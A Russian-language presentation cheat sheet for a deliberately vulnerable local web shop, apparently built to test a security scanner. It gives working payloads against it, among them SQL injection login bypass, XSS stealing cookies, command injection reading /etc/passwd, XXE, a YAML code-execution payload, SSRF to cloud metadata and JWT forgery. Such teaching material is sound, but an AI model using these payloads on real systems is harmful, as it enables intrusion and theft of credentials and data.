# VulnShop — шпаргалка для демонстрации

Сайт: http://127.0.0.1:5000  
Только локально. Для учебной презентации.

---

## 0. Подготовка

```bash
pip install -r requirements.txt
python app.py
```

Аккаунты:
- `alice` / `password`
- `bob` / `qwerty`
- `admin` / `admin123`

---

## 1. SQL Injection — обход входа

**Где:** http://127.0.0.1:5000/login  

**Суть:** логин и пароль вставляются в SQL без экранирования.

**Что ввести в поле «Логин»:**
```
admin' --
```
Пароль — любой (можно пустой).

**Что происходит:**  
запрос становится  
`SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`  
часть после `--` комментируется → вход как admin.

**Альтернатива (войти без знания логина):**
```
' OR '1'='1' --
```

**Для слайда:** «Классическая SQLi: кавычка закрывает строку, `--` отрезает проверку пароля».

---

## 2. SQL Injection — поиск

**Где:** http://127.0.0.1:5000/search  

**Запрос:**
```
%' OR 1=1 --
```

**Эффект:** вернутся все товары (условие `1=1` всегда истинно).

**Ещё сильнее (утечка схемы, если анализатор умеет):**
```
%' UNION SELECT id, username, password, email, role FROM users --
```

---

## 3. Reflected XSS — поиск

**Где:** http://127.0.0.1:5000/search  

**В строку поиска:**
```html
<script>alert('XSS')</script>
```

или:
```html
<img src=x onerror=alert(document.cookie)>
```

**Эффект:** скрипт выполняется в браузере жертвы при открытии ссылки.

**Для слайда:** «Можно украсть cookie сессии: `alert(document.cookie)`».

**Готовая ссылка для демо:**
```
http://127.0.0.1:5000/search?q=<script>alert('XSS')</script>
```

---

## 4. Stored XSS — отзывы

**Где:** товар → http://127.0.0.1:5000/product/1  

**В комментарий:**
```html
<script>alert('Stored XSS')</script>
```

или:
```html
<img src=x onerror=alert('Stored')">
```

**Эффект:** скрипт сохраняется в БД и срабатывает у **каждого**, кто откроет страницу товара.

**Для слайда:** «Reflected — один раз по ссылке. Stored — постоянно для всех посетителей».

---

## 5. IDOR — чужой профиль

**Где:** войти как `alice`, открыть профиль.  

**URL:**
```
http://127.0.0.1:5000/profile?id=1
```

Менять `id`:
| id | Кто |
|----|-----|
| 1  | admin (секрет в сообщениях) |
| 2  | alice |
| 3  | bob |

**Эффект:** чужие email, баланс, пароль, личные сообщения без проверки владельца.

**Для слайда:** «Меняем один параметр — получаем чужие данные. Авторизация ≠ авторизация доступа к объекту».

---

## 6. Path Traversal — чтение файлов

**Где:**
```
http://127.0.0.1:5000/download?file=catalog.txt
```

**Подмена:**
```
http://127.0.0.1:5000/download?file=../app.py
```

На Windows также:
```
http://127.0.0.1:5000/download?file=..\app.py
```

**Эффект:** скачивается исходный код сервера (секреты, логика).

В `share/catalog.txt` есть учебный флаг: `FLAG{path_traversal_works}`.

---

## 7. Command Injection — Ping

**Где:** http://127.0.0.1:5000/ping  

**Windows:**
```
127.0.0.1 & whoami
```

```
127.0.0.1 & dir
```

**Linux / macOS:**
```
127.0.0.1; id
```

```
127.0.0.1; cat /etc/passwd
```

**Эффект:** после ping выполняется своя команда ОС.

**Для слайда:** «Ввод пользователя попал в `shell=True` без фильтрации».

---

## 8. CSRF — поддельный перевод

**Где:** http://127.0.0.1:5000/transfer (нужен логин)  

**Суть:** форма без CSRF-токена. Пока жертва залогинена, вредоносная страница может отправить перевод.

**Демо-HTML (открыть с другого origin / файла, пока в VulnShop есть сессия):**

```html
<html>
<body>
  <h1>Бесплатный приз!</h1>
  <form id="f" action="http://127.0.0.1:5000/transfer" method="POST">
    <input type="hidden" name="to_user" value="bob">
    <input type="hidden" name="amount" value="50">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

**Эффект:** деньги уходят bob без ведома жертвы.

---

## 9. Unrestricted Upload

**Где:** http://127.0.0.1:5000/upload (нужен логин)  

Загрузить любой файл: `.html`, `.php`, `.exe`, скрипт.

Файл доступен по:
```
http://127.0.0.1:5000/uploads/имя_файла
```

**Для слайда:** «Нет whitelist расширений и проверки содержимого → RCE на «настоящем» сервере».

---

## 10. Broken Access Control — админка

**Где:** http://127.0.0.1:5000/admin  

**Способ 1:** войти через SQLi как admin (п.1).  

**Способ 2 (идея для слайда):** роль хранится в session cookie; при подмене `role=admin` доступ открывается без проверки в БД.

**Эффект:** таблица всех пользователей с паролями в открытом виде.

---

## 11. Information Disclosure — API

**Без логина открыть:**
```
http://127.0.0.1:5000/api/user/1
```

```
http://127.0.0.1:5000/api/user/2
```

**Ответ:** JSON с `password`, `email`, `balance`.

**Для слайда:** «API без авторизации = утечка учётных данных за один запрос».

---

## 12. Open Redirect

```
http://127.0.0.1:5000/redirect?url=https://example.com
```

**Для слайда:** «Фишинг: ссылка выглядит как доверенный сайт, а уводит на вредоносный».

---

## 13. Hardcoded secret + Debug

В `app.py`:
- `secret_key = "super-secret-key-12345"`
- `debug=True`

**Для слайда:** «Секрет в коде + debug → интерактивный отладчик при ошибке, кража сессий».

---

## 14. Mass Assignment + User Enumeration — регистрация

**Где:** http://127.0.0.1:5000/register

**Суть:** форма содержит скрытые поля `role` и `balance`. Через devtools/Burp меняете
`role=admin`, `balance=999999` — новый аккаунт сразу получает права администратора.

**Доп. эффект:** повторная регистрация логина `admin` возвращает сообщение «уже занят» —
можно перебором узнавать существующие логины.

**Для слайда:** «Клиент прислал — сервер поверил: скрытое поле стало привилегией».

---

## 15. Предсказуемый токен сброса пароля

**Где:** http://127.0.0.1:5000/forgot-password

**Суть:** токен = `md5(логин)`, без соли и срока действия. Вычисляется заранее для любого
известного логина (например `admin`) и используется для сброса пароля без доступа к почте.

**Для слайда:** «Токен для сброса пароля — не случайность, а функция от логина».

---

## 16. Blind / Time-based SQL Injection — категории

**Где:** http://127.0.0.1:5000/category/electronics

**Payload (время ответа увеличивается):**
```
electronics' OR SLEEP(2)='0
```

**Для слайда:** «Ошибок не видно, но по задержке ответа инъекция всё равно читается».

---

## 17. DOM-based XSS

**Где:** http://127.0.0.1:5000/about#&lt;img src=x onerror=alert(1)&gt;

**Суть:** клиентский JS читает `location.hash` и вставляет его в `innerHTML` без санитизации.
Полезная нагрузка на сервер не попадает — нужен анализ самого JS/DOM.

---

## 18. SSTI — подпись для писем

**Где:** http://127.0.0.1:5000/signature

**Payload:**
```
{{ 7*7 }}
{{ config }}
```

**Для слайда:** «Текст пользователя стал шаблоном Jinja2, который выполняется на сервере».

---

## 19. XXE — отзыв в XML

**Где:** http://127.0.0.1:5000/feedback

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<feedback><name>t</name><message>&xxe;</message></feedback>
```

**Для слайда:** «XML может попросить сервер прочитать файл со своего же диска».

---

## 20. Insecure Deserialization — импорт YAML

**Где:** http://127.0.0.1:5000/import-config

**Payload:**
```yaml
!!python/object/apply:os.popen ["id"]
```

**Для слайда:** «`yaml.load` без `safe_load` = выполнение произвольного Python-кода».

---

## 21. Insecure Deserialization — корзина в cookie (pickle)

**Где:** http://127.0.0.1:5000/cart

**Суть:** cookie `cart` — это `base64(pickle.dumps(...))`, сервер десериализует её без подписи.
Специально собранный pickle с `__reduce__` выполнит код на сервере при простом открытии `/cart`.

**Доп. эффект:** цена товара в форме добавления доверяется клиенту — можно поставить `price=0.01`.

---

## 22. SSRF — проверка ссылки

**Где:** http://127.0.0.1:5000/fetch

**Payload:**
```
http://127.0.0.1:5000/api/user/1
http://169.254.169.254/latest/meta-data/
```

**Для слайда:** «Сервер — это ваш прокси во внутреннюю сеть, если ему не указать, куда нельзя».

---

## 23. JWT без проверки подписи

**Где:** http://127.0.0.1:5000/api/session (cookie `remember_token`, выдаётся при `/login`)

**Суть:** эндпоинт декодирует JWT с `verify_signature=False` — значения `username`/`role`
принимаются как есть, подпись не проверяется. Токен с `alg=none` и `role=admin` пройдёт.

---

## 24. Race Condition — перевод средств

**Где:** http://127.0.0.1:5000/transfer

**Суть:** проверка баланса и его списание разнесены по времени без блокировки. Параллельные
запросы с суммой, равной текущему балансу, могут увести баланс в минус (double-spend).

---

## 25. Business Logic — отрицательная сумма перевода (API)

**Где:** http://127.0.0.1:5000/api/transfer (POST, JSON)

**Payload:**
```json
{"to_user": "bob", "amount": -1000}
```

**Для слайда:** «Забыли проверить знак числа — и перевод превратился в получение денег».

---

## 26. Permissive CORS

**Где:** заголовки ответа любого `/api/*`

**Суть:** `Access-Control-Allow-Origin: *` вместе с `Access-Control-Allow-Credentials: true` —
комбинация, которую браузеры не должны принимать, но которую реально настраивают на проде.

---

## 27. Утечка конфигурации и бэкапов

**Где:**
```
http://127.0.0.1:5000/.env
http://127.0.0.1:5000/.git/config
http://127.0.0.1:5000/download?file=backup.zip
http://127.0.0.1:5000/download            (листинг каталога)
http://127.0.0.1:5000/robots.txt           (подсказывает «интересные» пути)
```

**Для слайда:** «Забытые файлы на проде — бесплатный доступ к секретам без единой уязвимости в коде».

## Контрольные точки (негативные примеры)

Для проверки, что сканер **не** плодит ложные срабатывания — те же функции, но защищённые:

```
/safe/search    — параметризованный запрос + автоэкранирование
/safe/login     — параметризованный запрос, единое сообщение об ошибке
/safe/transfer  — CSRF-токен, сверка через hmac.compare_digest
/safe/upload    — allowlist расширений, лимит размера, случайное имя файла
```

Полный машиночитаемый эталон (все уязвимости + контрольные точки, с CWE/OWASP/severity) —
**`VULN_MAP.json`** в корне репозитория.

---

## Рекомендуемый порядок на презентации (7–10 мин)

1. **API** `/api/user/1` — сразу видно пароли (вау-эффект, 30 сек)
2. **SQLi** на логине `admin' --` — вход админом
3. **Админка** — таблица паролей
4. **IDOR** `profile?id=1` — чужие сообщения
5. **XSS** в поиске — `alert`
6. **Stored XSS** в отзыве — «теперь у всех»
7. **Path Traversal** — скачать `app.py`
8. **Command Injection** — `whoami`
9. **Утечка `.env` / `backup.zip`** — «забытые» файлы без единой инъекции
10. **Mass Assignment** на `/register` — мгновенный админ
11. **SSTI → XXE → YAML RCE** — три разных способа выполнить код через ввод текста
12. **SSRF** на `/fetch` — сервер как прокси во внутреннюю сеть
13. **Безопасная зона** `/safe/*` — показать, что сканер не должен ругаться на эти страницы
14. Итог: сверка находок сканера с `VULN_MAP.json`

## Короткие фразы для слайдов

| Уязвимость | Одна фраза |
|------------|------------|
| SQLi | Доверяем строке пользователя как SQL |
| XSS | Браузер выполняет чужой JS |
| IDOR | Знаем id — читаем чужое |
| Path Traversal | `../` выходит из разрешённой папки |
| Command Injection | Ввод = команда ОС |
| CSRF | Действие от имени жертвы без её клика |
| Upload | Любой файл = потенциальный шелл |
| Broken Access | Роль в cookie ≠ проверка прав |
| API leak | Нет auth на чувствительном endpoint |
| Mass Assignment | Скрытое поле формы стало привилегией |
| SSTI | Текст пользователя выполняется как код шаблона |
| XXE | XML попросил сервер прочитать свой же диск |
| YAML/pickle RCE | Десериализация без проверки = выполнение кода |
| SSRF | Сервер — прокси во внутреннюю сеть по чужой просьбе |
| JWT alg=none | Подпись не проверили — поверили любому токену |
| Race Condition | Проверили баланс — списали позже; кто-то успел дважды |
| Негативная сумма | Забыли проверить знак — перевод стал начислением |
| Секреты в `.env`/`.git` | Забытый файл на проде = бесплатный доступ без эксплойта |

## Что сказать в конце

> Все дыры типичны для реальных приложений. Анализатор ИБ должен находить их автоматически: SQLi, XSS, IDOR, path traversal, command injection, CSRF, misconfigurations. Этот стенд — полигон для проверки, что детектор работает.
